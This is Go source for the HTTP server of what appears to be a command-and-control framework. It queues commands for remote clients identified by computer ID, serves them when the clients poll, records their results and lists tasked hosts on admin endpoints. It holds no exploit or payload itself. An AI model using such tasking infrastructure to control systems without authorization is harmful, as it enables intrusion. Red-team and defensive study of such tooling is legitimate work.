package server

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"strconv"
	"time"

	"github.com/dobin/antnium/model"
	"github.com/gorilla/handlers"
	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

type Server struct {
	port   int
	cmdDb  CmdDb
	hostDb HostDb
}

func NewServer(port int) Server {
	w := Server{port, MakeCmdDb(), MakeHostDb()}
	rand.Seed(time.Now().Unix())
	return w
}

func (s *Server) Serve() {
	srvaddr := "127.0.0.1:4444"
	myRouter := mux.NewRouter().StrictSlash(true)

	myRouter.HandleFunc("/admin/commands", s.adminListCommands)
	myRouter.HandleFunc("/admin/clients", s.adminListClients)
	myRouter.HandleFunc("/admin/addTestCommand", s.adminAddTestCommand)

	myRouter.HandleFunc("/getCommand/{computerId}", s.getCommand)
	myRouter.HandleFunc("/sendCommand", s.sendCommand)

	// Angular UI via static directory. Copied during build.
	myRouter.PathPrefix("/").Handler(http.FileServer(http.Dir("./static")))
	// Allow CORS
	corsObj := handlers.AllowedOrigins([]string{"*"})

	fmt.Println("Starting webserver on " + srvaddr)
	log.Fatal(http.ListenAndServe(srvaddr, handlers.CORS(corsObj)(myRouter)))
}

func (s *Server) adminListCommands(rw http.ResponseWriter, r *http.Request) {
	srvCmds := s.cmdDb.getAll()
	json, err := json.Marshal(srvCmds)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *Server) adminListClients(rw http.ResponseWriter, r *http.Request) {
	hostList := s.hostDb.getAsList()
	json, err := json.Marshal(hostList)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}
	fmt.Fprint(rw, string(json))
}

func (s *Server) adminAddTestCommand(rw http.ResponseWriter, r *http.Request) {
	c := model.NewCommandTest("0", strconv.Itoa(rand.Int()), []string{"arg0", "arg1"}, "")
	srvCmd := NewSrvCmd(c, STATE_RECORDED, SOURCE_SRV)
	s.cmdDb.add(srvCmd)
}

func (s *Server) getCommand(rw http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	computerId := vars["computerId"]

	// Update last seen for this host
	s.hostDb.updateFor(computerId)

	command, err := s.cmdDb.getCommandFor(computerId)
	if err != nil {
		return
	}

	json, err := json.Marshal(command)
	if err != nil {
		log.Error("Could not JSON marshal")
		return
	}

	log.WithFields(log.Fields{
		"command": command,
	}).Info("Get command")

	fmt.Fprint(rw, string(json))
}

func (s *Server) sendCommand(rw http.ResponseWriter, r *http.Request) {
	reqBody, err := ioutil.ReadAll(r.Body)
	if err != nil {
		log.Error("Could not read body")
		return
	}
	command, err := model.JsonToCommand(string(reqBody))
	if err != nil {
		log.WithFields(log.Fields{
			"body":  reqBody,
			"error": err,
		}).Info("Error executing command")
		return
	}

	log.WithFields(log.Fields{
		"command": command,
	}).Info("Send command")

	s.cmdDb.update(command)
	s.hostDb.updateFor(command.GetComputerId())
	fmt.Fprint(rw, "asdf")
}
